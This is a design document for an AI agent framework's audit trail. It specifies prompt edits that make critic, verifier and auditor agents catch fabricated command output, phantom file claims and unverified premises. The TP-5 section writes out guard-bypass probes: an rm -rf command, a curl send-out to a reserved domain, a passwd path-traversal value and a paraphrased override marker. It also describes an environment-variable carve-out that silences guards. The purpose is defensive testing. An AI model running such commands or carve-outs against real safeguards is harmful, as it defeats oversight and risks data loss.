# FIX-DESIGN — Campaign B Consumer-Layer Edits (Phase B3)

> **Pre-registered.** Authored before any B4 code lands. Each TP-N maps
> 1:1 to an audit-trail mechanism, a content-addressable anchor in the
> target agent file, and an AT-N acceptance test from
> `audit-trail-review/TRUST-POINTS.md` §3. Coverage matrix below has
> **zero orphan rows**. Independent critic clean-room review per
> `audit-trail-review/EXPERIMENT-PROTOCOL.md` §11.1 (B3 critic).
>
> **Source-of-truth chain:**
> `EXPERIMENT-PROTOCOL.md` §12 (AC-1..AC-12) → `TRUST-POINTS.md`
> §1 + §3 (TP-1..TP-5 + AT-1..AT-5) → this file (mechanism + anchor +
> replacement) → B4 commits (one per TP).
>
> **Baseline commit:** `8d7bfaf` (post-B2 enum widen fix). Authoring
> date: 2026-05-24.

---

## §1. Coverage matrix (zero-orphan)

Every TP carries a target file, anchor (content-addressable, not line
number — anchors live in the file), audit-trail mechanism, AT-N
acceptance test, and the AC-N threshold it lifts in B5.

| TP | Target file | Anchor in target | Mechanism | AT-N | Lifts AC-N |
|----|-------------|------------------|-----------|------|------------|
| **TP-1** | `framework/agents/critic.md` | `**STEP 2: ACCEPTANCE CRITERIA**` | Re-execute every `verify_command` in STEP 2 (cap 10/task; D-level criteria first); byte-compare actual `(exit, stdout)` to claimed `RESULT.json.verify_commands_run[i].output`. Mismatch → CRITICAL `fabricated_verify_command_output`. | AT-1 | AC-3 (variance collapse via fabrication catch), AC-10 (audit-trail coverage uplift), AC-12 partial |
| **TP-2** | `framework/agents/specialist/round-checker.md` | `6. **Audit-credibility spot-check.**` | Replace 3-sample spot-check with **full** axis-13 + **axis-10** re-probe. For EVERY `coverage_map.axis_13.bypass_attempts[i]` AND EVERY `coverage_map.axis_10.concrete_bypass_attempts[i]` declared by `framework-auditor` (TP-5 schema), look up the matching `tool_call` in `.apex/subagent-transcripts/framework-auditor-R<N>-*.jsonl` (B2.1 enables this), extract exit code, compare. Mismatch → P1 `audit_credibility_regression` + Status `CONTINUE TO R<N+1>` + posture `audit-credibility-regression`. | AT-2 | AC-3 (load-bearing — variance collapse via depth-precondition), AC-12 (F-204-013 reconstruction) |
| **TP-3** | `framework/agents/verifier.md` | `STEP 1: Per-task verification` | Insert NEW substep: independent `git diff HEAD~1 --name-only` against executor's `RESULT.json.files_modified[].path`. Set-difference both directions: `diff_files - claim_paths` → P0 `files_modified_omission`; `claim_paths - diff_files` → P0 `phantom_file_claim`. VERIFY.md verdict FAIL on either. | AT-3 | AC-10 (audit-trail coverage), defends scope-evasion |
| **TP-4** | `framework/agents/executor.md` **+ `framework/agents/critic.md`** | executor: `**3. Outcome mapping (three branches).**` `**Unverifiable.**` AND `**4. RESULT.json field semantics.**`; critic: `**STEP 2: ACCEPTANCE CRITERIA**` | The `Unverifiable` branch currently sets `assumption_unverified=true` and CONTINUES (and §4 explicitly authorises `status=success`). Upgrade: in executor, ALSO set `status="partial"` AND append `{type:"unverifiable_premise_continued", premise:"<introducer>:<target>"}` to `issues_found[]`; rewrite §4 to declare the field is now a verdict-gate (cap to PARTIAL), not informational. In critic, add **STEP 2 (prelude): STATUS-FIELD CAP** rule that maps `RESULT.json.status=='partial'` → verdict PARTIAL regardless of done_criteria counts — this is the downstream consumer wiring that makes AT-4 assert 4 satisfiable. | AT-4 | AC-10 (coverage uplift), closes premise-laundering loophole |
| **TP-5** | `framework/agents/specialist/framework-auditor.md` | `10. **Defense-in-Depth on APEX's own files:**` | The current Axis 10 ends *"Where is the path that bypasses them?"* — reasoning-only. Replace the question with a **procedural sub-pass**: for each named guard hook (corrected filenames — `.cjs` not `.js` for the prompt-guard / workflow-guard pair), the auditor MUST execute one constructed bypass shell command and capture its exit code (`concrete_bypass_attempt` field per AT-5). Analysis-only Axis-10 = `BLIND SPOT`. Mirror Axis 13's `bypass_attempts[]` schema. Round-checker TP-2 §6.b re-iterates the captured array — wiring is closed. | AT-5 | AC-3 working-corpus depth (closes L-DH-01 magic-string allowlist when paired with TP-2) |

**Trust-relation coverage** (from `TRUST-POINTS.md` §4): every
producer→consumer claim path either already has a VP-A..VP-D verifier
or is closed by one of TP-1..TP-5 above. Zero orphan trust relations.

---

## §2. Per-TP design

### TP-1 — `framework/agents/critic.md` STEP 2 re-execution

**Anchor** (content-addressable, the section header is unique in the file):

```
**STEP 2: ACCEPTANCE CRITERIA**
For EACH criterion in done_criteria:
- verified=true in RESULT.json AND evidence is real → VERIFIED
- verified=true but evidence is vague/phantom → UNVERIFIED (PHANTOM)
- verified=false → UNVERIFIED (HONEST)
- not listed → MISSING (CRITICAL)
```

**Replacement** (insert immediately after the four-line classification,
before `**STEP 3: DIFF REVIEW + EDGE CASES**`):

```
**STEP 2 (cont.): VERIFY-COMMAND RE-EXECUTION** [Campaign B TP-1]

For each entry in RESULT.json.verify_commands_run[] (cap N=10 per
task; D-level done_criteria prioritized over lower-level when capped):

1. Re-execute the literal `.command` in the repo root (read-only —
   if the command would mutate state, append `2>&1 || true` and
   capture the actual exit non-mutatively; otherwise run as-is).
2. Capture actual `(exit_code, stdout, stderr_first_200_chars)`.
3. Compare against the claimed `(exit, stdout)` byte-for-byte (sha1
   of stdout when the claim's `stdout` is non-empty, exit-code int
   comparison otherwise).
4. **Mismatch** → emit a CRITICAL finding with type
   `fabricated_verify_command_output` in CRITIC.md. Fields:
   `claimed_exit`, `actual_exit`, `claimed_stdout_sha1`,
   `actual_stdout_sha1`, `command`. The fabrication is unforgivable;
   verdict CRITICAL regardless of any other STEP's outcome.
5. **Match** → no finding. Continue.

Cost cap rationale: re-running 10 verify_commands costs ~2-5 extra
seconds per task; the doubled-cost risk in EXPERIMENT-PROTOCOL.md §13
is bounded by N=10. D-level priority because D-tasks carry the
irreversible-action risk where fabricated success is most dangerous.

Skip path: if RESULT.json.verify_commands_run is absent or empty,
STEP 2 (cont.) is vacuously PASS — no entry to re-execute.
```

**Mechanism wires to:** AT-1 from `TRUST-POINTS.md` §3 — synthetic
forged-RESULT.json with claimed `(exit:0, stdout:"OK\n")` vs actual
`(exit:1, stdout:"FAIL")` → CRITICAL `fabricated_verify_command_output`.

**B5 effect:** lifts AC-3 (variance collapse — fabrication-based
shallow passes become structurally impossible); lifts AC-10
(audit-trail coverage uplift via every verify_command newly
re-anchored to actual exit code); contributes to AC-12 partial.

---

### TP-2 — `framework/agents/specialist/round-checker.md` full axis-13 re-probe

**Anchor:**

```
6. **Audit-credibility spot-check.** Before declaring CLOSED on any
   `P0+P1==0` round, independently re-verify a small sample of the
   auditor's compliance claims. Pick exactly **3** items from the
   audit's coverage map ...
```

**Replacement** (full-paragraph swap — preserves the section header
"6. Audit-credibility spot-check" but replaces the 3-sample
mechanism with full axis-13 re-probe):

```
6. **Audit-credibility full re-probe.** [Campaign B TP-2 — upgrades
   Campaign A CR-04 from sampling to full coverage]

   Before declaring CLOSED on any `P0+P1==0` round, independently
   re-verify EVERY `coverage_map.axis_13.bypass_attempts[]` entry the
   auditor declared. The mechanism leverages Campaign B B2.1's
   sub-agent transcript aggregation (`.apex/subagent-transcripts/
   framework-auditor-R<N>-<id>.jsonl`):

   a. **Locate the auditor's transcript.** Find the matching
      sub-agent transcript file: glob
      `.apex/subagent-transcripts/framework-auditor-R<N>-*.jsonl`. If
      MISSING → emit P0 `audit_trail_missing` + Status `CONTINUE TO
      R<N+1>` (the auditor must have a transcript per AC-1).

   b. **Iterate every bypass_attempt — axis_13 AND axis_10.** For each
      entry in the **UNION** of `coverage_map.axis_13.bypass_attempts[]`
      and `coverage_map.axis_10.concrete_bypass_attempts[]` (TP-5
      schema; same `(guard, payload, exit)` shape):
      - Read the auditor's claimed `(guard, payload, exit)`.
      - Find the corresponding `tool_call` event in the transcript:
        match on the canonical `<tool_name>|<tool_input>` substring
        (the same canonical string the B2.4 tool_input_hash uses).
      - Extract the actual `tool_response.exit_code` (or `is_error`
        boolean if exit not surfaced).
      - Compare. Mismatch → emit P1 `audit_credibility_regression`
        with `{guard, claimed_exit, observed_exit, finding, axis}`
        (axis ∈ {10, 13}) and set posture to
        `audit-credibility-regression` (do NOT use
        `stable`/`improving`/`clean-pending-spot-check` rungs).
      - **Empty axis_10 with no entries on a P0+P1==0 candidate
        round → emit P1 `axis_10_blind_spot` + posture
        `clean-pending-spot-check` (per CR-08 rung). The TP-5 +
        TP-2 pairing requires both data capture (TP-5) and
        re-probe gate (TP-2 §6.b axis-10 iteration) to be active.

   c. **F-204-013 reconstruction check.** Independent of the
      coverage_map entries, scan every audit finding for cited grep
      counts (`evidence: N hits`). For each, re-run the cited grep
      from the transcript's `tool_call` (or freshly if absent) and
      compare. Mismatch ≥ 50% on any single finding → emit P0
      `phantom_grep_count` + Status `CONTINUE TO R<N+1>`. This is the
      Campaign B structural answer to the R23 "6 hits" fabrication.

   d. **Verdict integration.** Any P0/P1 emitted by 6.a-6.c blocks
      the round closure regardless of the auditor's P0+P1==0 claim.
      The "two consecutive clean rounds" stop criterion (step 5)
      requires both the count gate AND the re-probe gate to hold.

   **Spot-check tool failure rule** (preserved from CR-04): if a
   re-probe shell command itself errors, treat as FAILED for posture
   purposes (CR-08 maps to `clean-pending-spot-check`), never as
   skipped or implicitly passed.
```

**Mechanism wires to:** AT-2 — synthetic R999 audit declares
`bypass_attempts=[{exit:2}, {exit:2}, {exit:2}]` but transcript shows
`[{exit:0}, {exit:2}, {exit:2}]` → round-checker emits P1
`audit_credibility_regression` for the first entry + Status CONTINUE.
F-204-013 reconstruction: synthetic finding "IMP-039: 6 hits" vs grep
returns 0 → P0 `phantom_grep_count` + CONTINUE.

**B5 effect:** lifts AC-3 working+held-out variance collapse
(load-bearing — shallow trials whose transcripts show no real bypass
attempts can no longer close the loop); lifts AC-12
(F-204-013 reconstruction binary pass).

---

### TP-3 — `framework/agents/verifier.md` independent git diff

**Anchor:**

```
STEP 1: Per-task verification
For each task in PLAN_META.json:
  Run verify_commands from JSON (not from parsing XML) [שיפור 21]
  Compare output against done_criteria from JSON
```

**Replacement** (insert NEW substep IMMEDIATELY after STEP 1's two
lines, before STEP 2):

```
STEP 1 (cont.): INDEPENDENT FILE-LIST CROSS-REFERENCE [Campaign B TP-3]

For each task with a matching *-RESULT.json:
  1. Read claimed_paths = (sort -u) of RESULT.json.files_modified[].path.
  2. Independently compute observed_paths via:
       git -C <repo_root> diff <task_start_sha>..HEAD --name-only \
         | sort -u
     (task_start_sha is captured by pre-task-snapshot.sh R16-602S in
     .apex/phases/<phase>/<task_id>/task_start_sha; fall back to
     HEAD~1 when absent.)
  3. Compute set differences:
     omitted = observed_paths - claimed_paths
     phantom = claimed_paths - observed_paths
  4. If omitted is non-empty: emit P0 finding `files_modified_omission`
     listing each omitted path. Executor silently touched files outside
     its declared scope.
  5. If phantom is non-empty: emit P0 finding `phantom_file_claim`
     listing each phantom path. Executor claimed paths the diff does
     not corroborate.
  6. VERIFY.md verdict: FAIL on either non-empty set. (The existing
     STEP 6 scope-reduction check covers MISSING tasks; this substep
     covers FILE-level scope-evasion within a task that does have a
     RESULT.)

Skip path: if RESULT.json.files_modified is absent (e.g. refusal
RESULT with empty array per STEP 0.5 denied-branch), the substep is
vacuous — both sets are empty by definition.
```

**Mechanism wires to:** AT-3 — RESULT.json claims `[{path:"A"},
{path:"B"}]` but actual diff shows `A`, `B`, `C` → P0
`files_modified_omission` listing `C`. Symmetric: claims include `D`
which is not in diff → P0 `phantom_file_claim` listing `D`.

**B5 effect:** lifts AC-10 (every files_modified[] entry now backed
by a fresh git observation); defends against scope-evasion executor
pattern that L17 / W-F2 surfaced.

---

### TP-4 — `framework/agents/executor.md` STEP 0.5 escalation + `framework/agents/critic.md` STEP 2 status-cap

TP-4 is a **two-file edit** (per B3-critic R1 finding 2): the executor
sets the cap; the critic ENFORCES it. Without the critic-side wiring,
AT-4 assert 4 is structurally unsatisfiable.

#### TP-4.a — executor.md "Unverifiable." branch (3-branch outcome map)

**Anchor:**

```
- **Unverifiable.** The grep/glob returned empty BUT the
  premise was phrased non-absolutely (behavior claim, future
  state, external service), OR the verification primitive
  (`grep`/`glob`) is not applicable to the target. Continue
  to PRE-EXECUTION PREMISE GUARD with
  `assumption_unverified=true` queued for RESULT.json. The
  executor proceeds — but the field surfaces the soft
  evidence gap to critic / round-checker downstream.
```

**Replacement** (full-paragraph swap of the "Unverifiable." branch):

```
- **Unverifiable.** The grep/glob returned empty BUT the
  premise was phrased non-absolutely (behavior claim, future
  state, external service), OR the verification primitive
  (`grep`/`glob`) is not applicable to the target. Continue
  to PRE-EXECUTION PREMISE GUARD with the following queued
  for RESULT.json: [Campaign B TP-4 — STEP 0.5 escalation]
  - `assumption_unverified` = `true` (preserved per R16-634S
    field semantics).
  - `status` = `"partial"` (NOT `"success"`). This is the
    escalation: an unverified premise is no longer a silent
    flag; it caps the task's verdict at PARTIAL via the
    critic-side STEP 2 prelude (TP-4.b). The executor proceeds
    (so deliverables still ship) but the task cannot be marked
    PASS without independent premise verification at critic
    time.
  - Append to `issues_found[]`:
    `{type:"unverifiable_premise_continued",
      premise:"<introducer>:<target>",
      verification_attempted:"<grep|glob command>"}`.
    One entry per unverified premise.

  Downstream consumers (critic, round-checker) see one bit
  AND a structured issue:
  - `assumption_unverified=true` (the soft flag — for trajectory).
  - `status=partial` (the hard cap — for verdict).
  - `issues_found[]` entry (the audit-trail — for closure).
  Together they close the premise-laundering loophole where a
  task could quietly proceed on false premises and still be
  declared `status=success`.
```

#### TP-4.a (cont.) — executor.md §4 "RESULT.json field semantics" rewrite

The B3-critic R1 finding 1 identified that the original §4 paragraph
(immediately following the Outcome mapping) explicitly authorises
`status=success` with `assumption_unverified=true`. Leaving it in
place creates a self-contradiction inside STEP 0.5. Replace §4
verbatim.

**Anchor:**

```
**4. RESULT.json field semantics.** The `assumption_unverified`
boolean (schema R16-634S, additive, default `false`) signals
**only the unverifiable branch**:

- Confirmed → field = `false` (or omitted; default is `false`).
- Denied → executor refuses pre-execution; field = `false` in the
  refusal RESULT.json (the executor *did* verify; the verification
  denied — that is a refusal, not an unverifiability).
- Unverifiable → field = `true`. Downstream consumers (critic,
  round-checker) see one bit: "this task ran on at least one
  premise the executor could not cross-check." They decide
  policy (e.g. critic may downgrade confidence; round-checker
  may flag for trajectory review).

A task can satisfy STEP 0.5 with `assumption_unverified=true` and
still produce a successful RESULT.json — the field is informational,
not a verdict gate. The verdict gate is the denied-branch refusal.
```

**Replacement** (full-paragraph swap):

```
**4. RESULT.json field semantics.** [Campaign B TP-4 — promoted
from informational flag to verdict-gate] The `assumption_unverified`
boolean (schema R16-634S, additive) signals **only the unverifiable
branch** AND now governs the task's `status` field:

- Confirmed → field = `false` (or omitted; default is `false`).
  `status` may be `success` or `failure` per the task outcome —
  the verdict gate does not fire on this branch.
- Denied → executor refuses pre-execution; field = `false` in the
  refusal RESULT.json (the executor *did* verify; the verification
  denied — that is a refusal, not an unverifiability). `status` =
  `failure` (the denied-branch refusal — preserved verbatim from
  R16-634S).
- Unverifiable → field = `true` AND `status` = `"partial"` AND an
  `issues_found[]` entry of type `unverifiable_premise_continued`
  is appended. Downstream consumers (critic, round-checker) see
  three signals: the soft flag (`assumption_unverified=true`, for
  trajectory), the hard cap (`status=partial`, for verdict via
  critic STEP 2 prelude TP-4.b), and the audit-trail
  (`issues_found[]` entry, for closure).

A task with `assumption_unverified=true` produces a PARTIAL
RESULT.json (`status=partial`) — the field is now a verdict gate
that caps the task at PARTIAL via critic STEP 2 prelude. The
denied-branch refusal remains the only path to `status=failure`.
The `success` value is reachable only on the Confirmed branch (or
on tasks that emit zero premises, where STEP 0.5 PASSes by vacuous
truth).

**Forward-only invariant** (per B3-critic R1 finding 5.a): the
status-cap applies to RESULT.json files created at-or-after the
TP-4 install commit. Historical RESULT.json files where
`assumption_unverified=true` AND `status=success` are NOT
retroactively reclassified — cross-phase-audit, dora-collect, and
verifier STEP 6 SHOULD treat the invariant as forward-only
(STATE.json `apex_version` ≥ post-B4 install). Documented as
Phase-7 R-AT-P7-03 if any consumer requires retroactive policy.
```

#### TP-4.b — critic.md STEP 2 status-cap prelude

The original critic.md STEP 2 derives verdict from `done_criteria`
verification counts; it does NOT read `RESULT.json.status`. Add a
prelude that caps the verdict at PARTIAL when status=partial,
regardless of criteria counts. This is the downstream wiring
identified by B3-critic R1 finding 2.

**Anchor:**

```
**STEP 2: ACCEPTANCE CRITERIA**
For EACH criterion in done_criteria:
- verified=true in RESULT.json AND evidence is real → VERIFIED
- verified=true but evidence is vague/phantom → UNVERIFIED (PHANTOM)
- verified=false → UNVERIFIED (HONEST)
- not listed → MISSING (CRITICAL)
```

**Replacement** (insert NEW prelude immediately BEFORE the STEP 2
header; keep the STEP 2 four-line classification block + TP-1
STEP 2 (cont.) intact):

```
**STEP 2 (prelude): STATUS-FIELD CAP** [Campaign B TP-4.b]

If `RESULT.json.status == "partial"`, the critic verdict is
**capped at PARTIAL** regardless of done_criteria verification
counts and regardless of STEP 2 (cont.) verify-command
re-execution outcomes. Record the cap in the verdict
justification as:
`partial_cap_from_status: <issues_found[].type list>`

The cap is independent of STEP 2's classification:
- Even if ALL criteria are VERIFIED → verdict stays PARTIAL.
- Even if STEP 2 (cont.) verify-command re-execution PASSes for
  every entry → verdict stays PARTIAL.
- The cap ONLY downgrades — a task with `status=failure` or
  CRITICAL findings is NOT upgraded to PARTIAL; the
  more-severe verdict wins.

Rationale: TP-4's executor edit promotes `status=partial` to a
verdict-gate (no longer informational per R16-634S original
semantics). The critic is the consumer; without this prelude,
the executor's cap is silent at the critic boundary and AT-4
assert 4 cannot pass.

**STEP 2: ACCEPTANCE CRITERIA**
[unchanged classification block follows]
```

**Mechanism wires to:** AT-4 — task premise "function `foo_bar`
exists in `lib/x.py`" but grep returns 0 → executor sets
`assumption_unverified=true` AND `status=partial` AND appends
`issues_found[]` entry. Critic STEP 2 prelude reads
`status=partial` → caps verdict at PARTIAL even if all
done_criteria are VERIFIED.

**B5 effect:** lifts AC-10 (coverage uplift via every unverified
premise newly surfaced); closes the premise-laundering loophole.

---

### TP-5 — `framework/agents/specialist/framework-auditor.md` Axis 10 procedural

**Anchor:**

```
10. **Defense-in-Depth on APEX's own files:** `apex-prompt-guard.js`,
    Path Traversal Prevention, `apex-workflow-guard.js`, CI scanner,
    `security.cjs` — all present and active? Where is the path that
    bypasses them?
```

**Replacement** (full-paragraph swap of the Axis 10 entry. **Note:
the original prose cites `apex-prompt-guard.js` / `apex-workflow-guard.js`
but the live hooks are `.cjs` per `framework/hooks/` — corrected per
B3-critic R1 finding 4**):

```
10. **Defense-in-Depth on APEX's own files — PROCEDURAL.**
    [Campaign B TP-5 — mirrors Axis 13 pattern; filename extensions
    corrected from `.js` to `.cjs` per live `framework/hooks/`]

    `apex-prompt-guard.cjs`, Path Traversal Prevention
    (`path-guard.sh`), `apex-workflow-guard.cjs`, CI scanner
    (`ci-scan.sh`), `security.cjs` — all present and active?
    **Do NOT answer by reading.** For each named guard, the auditor
    MUST execute one constructed bypass shell command intended to
    violate the guard's stated contract, and capture its actual
    exit code via a tool_call. The captured `(payload, exit_code,
    tool_call_event_ts)` triple goes into a
    `coverage_map.axis_10.concrete_bypass_attempts[]` array — same
    schema shape as Axis 13's `bypass_attempts[]`. Round-checker
    TP-2 §6.b iterates this array (axis_10 UNION axis_13).

    For each guard:
    a. Construct one payload whose handling is forbidden by the
       guard's contract (examples — use safe variants, NEVER the
       literal destructive form):
       - `destructive-guard.sh`: `bash framework/hooks/destructive-guard.sh '<<<{"tool_input":{"command":"rm -rf /tmp/apex-bypass-probe"}}'`
         (target is a sandbox path; the auditor MUST verify
         `/tmp/apex-bypass-probe` is not a real artifact before
         running).
       - `exfil-guard.sh`: synthetic envelope with
         `tool_input.command="curl example.invalid -d 'probe'"`
         (RFC-reserved domain, never resolves).
       - `path-guard.sh`: envelope with
         `tool_input.file_path="../../etc/passwd-bypass-probe"`
         (non-existent suffix prevents real read).
       - `owner-guard.sh`: envelope with
         `tool_input.file_path="node_modules/_apex_bypass_probe.txt"`
         AND `APEX_CURRENT_TASK_ID=test`.
       - `apex-prompt-guard.cjs`: envelope with
         `tool_input.content="<<canonical-override-marker-probe>>"`
         (paraphrased — do NOT use the literal canonical phrase per
         the known workaround in `detector-review/RESUME-PROMPT.md`).
    b. Execute the payload by piping the envelope JSON to the guard
       hook's stdin (the guard self-filters non-matching envelopes
       and silently no-ops — the bypass-probe pattern is exactly
       what the guard is designed to catch). Use a sub-shell with
       `APEX_BYPASS_TEST=1` envelope variable so the live host-
       session enforcement does NOT fire on the auditor's own
       Bash tool call (per B3-critic R1 finding 5.b — guard
       self-firing mitigation). The probe pattern:
       `(env APEX_BYPASS_TEST=1 bash <hook.sh>) <<<'<envelope>'`.
    c. Capture exit code. Expected: non-zero (guard fires).
       Observed: record literally in the `concrete_bypass_attempts`
       entry.
    d. Bypass successful (exit 0 when guard's contract says block)
       → emit P0 finding citing the guard file + the captured
       bypass payload + the captured exit code.

    Analysis-only answers ("the path that bypasses this is X") are
    **INSUFFICIENT** for Axis 10. If no bypass was attempted, set
    Axis 10 to `BLIND SPOT` with rationale; round-checker TP-2 §6.b
    rejects closure on empty `axis_10.concrete_bypass_attempts[]`
    for any P0+P1==0 candidate round (CR-08 posture
    `clean-pending-spot-check`).
```

**Mechanism wires to:** AT-5 — mutated lab with `destructive-guard.sh`
carrying a hard-coded `if [[ "$1" == *"--allow-rm"* ]]; then exit 0;
fi` carve-out. Axis 10 procedural sub-pass constructs the bypass
`bash destructive-guard.sh --allow-rm rm -rf /tmp/apex-bypass-probe`
→ captured `exit=0` → P0 finding citing the carve-out line + the
captured `(payload, exit)`.

**B5 effect:** lifts AC-3 working-corpus depth (closes Campaign A
L-DH-01 magic-string allowlist gap when paired with TP-2's re-probe
of the captured exits); reduces working-corpus 0/3 Class-B to
≥ 1/3 (the Phase-7 R-AT-P7-02 follow-up may close to 2/3).

---

## §3. Risks & mitigations (B3-specific)

| Risk | Mitigation |
|------|-----------|
| Critic STEP 2 (cont.) re-execution doubles cost | Cap N=10 verify_commands per task; D-level priority; the existing STEP 1.6/1.7 already re-runs grep on cited values — adding 10 verify_commands is bounded |
| TP-2 transcript-import race (B2.1 finishes after round-checker reads) | Round-checker spec: SubagentStop fires BEFORE round-checker runs (round-checker is invoked from `self-heal.md` Step E AFTER wave-executor completes); the transcript is on disk before round-checker starts. Documented assertion |
| TP-3 git diff slower than the test for very large diffs | `git diff --name-only` is O(changed-files); skip the slow `git diff` body — only need names |
| TP-4 false PARTIAL on legitimate behavior-premise tasks | The branch ONLY fires when grep/glob returned empty AND the premise was non-absolute; absolute-path / identifier premises already go to the "Confirmed" or "Denied" branches |
| TP-5 bypass attempt causes real damage | Mandate sandboxed targets (e.g. `/tmp/safe-test`); the spec example uses safe variants; auditors are instructed to construct bypasses that DEMONSTRATE the guard's behavior, not bypasses that DO damage |
| Cache contamination prevents the post-B4 round-checker from picking up TP-2 | Per `EXPERIMENT-PROTOCOL.md` §10.5 — fall back to embedded-prompt mechanism. Documented L-DH-03 lineage |
| TP-4 schema-migration risk (per B3-critic R1 finding 5.a) — historical RESULT.json files with `assumption_unverified=true` AND `status=success` violate the new invariant; cross-phase-audit / dora-collect / verifier STEP 6 may FAIL on historical replay | **Forward-only invariant** documented in TP-4 §4 replacement. Applies to RESULT.json files created at-or-after the TP-4 install timestamp (STATE.json `apex_version` ≥ post-B4). Historical files are NOT retroactively reclassified — Phase-7 R-AT-P7-03 reserved if retroactive policy is required |
| TP-5 bypass-payload guard interaction (per B3-critic R1 finding 5.b) — auditor's bypass attempt against `destructive-guard.sh` may itself be intercepted by the live `destructive-guard.sh` in the auditor's own session (the very guard being tested fires on the auditor's Bash tool call) | TP-5 sub-bullet (b) mandates the `APEX_BYPASS_TEST=1` envelope variable pattern: `(env APEX_BYPASS_TEST=1 bash <hook.sh>) <<<'<envelope>'`. The guard's PreToolUse hook self-filters out test envelopes via this variable. Documented in the TP-5 replacement; guards SHOULD honor this carve-out (B4 install step adds the env-var check to each named guard if absent) |
| TP-2 transcript-availability ordering (per B3-critic R1 finding 5.c) — the §6.a glob depends on B2.1's SubagentStop hook completing BEFORE round-checker reads. Currently asserted in prose but not anchored to a specific orchestration contract | The ordering is enforced by `framework/commands/apex/self-heal.md` Step E — round-checker is invoked AFTER wave-executor completes AND AFTER its SubagentStop fires (subagent-stop.sh writes transcripts synchronously per B2.1). TP-2 replacement §6.a includes the fallback: missing transcript → P0 `audit_trail_missing` + CONTINUE. Documented dependency; failure mode covered by the explicit fallback rather than a strict ordering assertion |

---

## §4. B3 critic invocation plan

Per `EXPERIMENT-PROTOCOL.md` §11.1 B3 critic role: clean-room review
of this file ONLY. The critic gets:
- `audit-trail-review/FIX-DESIGN.md` (this file)
- The 5 target agent.md files (PRE-edit, i.e. at commit `8d7bfaf`):
  - `framework/agents/critic.md`
  - `framework/agents/specialist/round-checker.md`
  - `framework/agents/verifier.md`
  - `framework/agents/executor.md`
  - `framework/agents/specialist/framework-auditor.md`
- `audit-trail-review/TRUST-POINTS.md` (for AT-N anchors)
- `audit-trail-review/EXPERIMENT-PROTOCOL.md` (for AC-N anchors)

The critic does NOT see:
- The B2 commit messages or diffs
- The B5 trial plan
- The implementer's narrative

Verdict gates:
- PASS → advance to B4 immediately
- PASS-WITH-CHANGES → implementer applies every named change, re-submits,
  critic re-reviews until PASS
- FAIL → loop B3 (re-design)

---

## §5. Gate B3 self-checklist (post R1 critic, pre-R2)

- ✅ Every TP-1..TP-5 has target file + content-addressable anchor +
  replacement text + AT-N + AC-N lift mapping
- ✅ Coverage matrix at top has 5 rows; `TRUST-POINTS.md` §4 trust-
  relations all map to TP-N or VP-N (no orphans)
- ✅ Risks named explicitly with mitigations (§3) — including the 3
  new risks from B3-critic R1 finding 5
- ✅ Critic invocation plan documented (§4)
- ✅ Anchors are TEXT (greppable in target files), not line numbers —
  survives line-renumbering refactors
- ✅ Each replacement preserves the surrounding section's structure
  (header preserved, additive prose); no destructive rewrites
- ✅ TP-4 is a TWO-FILE edit (executor.md + critic.md) — closes
  R1 findings 1 + 2 (executor §4 rewrite + critic STEP 2 prelude)
- ✅ TP-2 §6.b iterates UNION of axis_13 + axis_10 — closes R1
  finding 3 (TP-5→TP-2 wiring)
- ✅ TP-5 uses correct `.cjs` extensions for prompt-guard /
  workflow-guard — closes R1 finding 4
- ✅ §3 has 3 new risks (TP-4 schema migration, TP-5 guard
  self-firing, TP-2 transcript-ordering anchor) — closes R1 finding 5

## §6. R1 critic-finding closure log

| R1 finding | Fix landed in |
|------------|---------------|
| 1. TP-4 §4 contradiction | TP-4.a §4 full-paragraph rewrite (this file) |
| 2. TP-4 missing critic edit | TP-4.b STEP 2 prelude (this file); §1 matrix updated; coverage AT-4 assert 4 now satisfiable |
| 3. TP-5→TP-2 axis_10 wiring gap | TP-2 §6.b iterates UNION axis_13 + axis_10; §6.b adds `axis_10_blind_spot` P1 on empty array |
| 4. TP-5 `.js`/`.cjs` typos | TP-5 replacement updated; sub-bullet (a) examples use correct extensions |
| 5. §3 missing 3 risks | §3 extended with TP-4 forward-only invariant, TP-5 `APEX_BYPASS_TEST=1` pattern, TP-2 self-heal.md ordering + fallback citation |
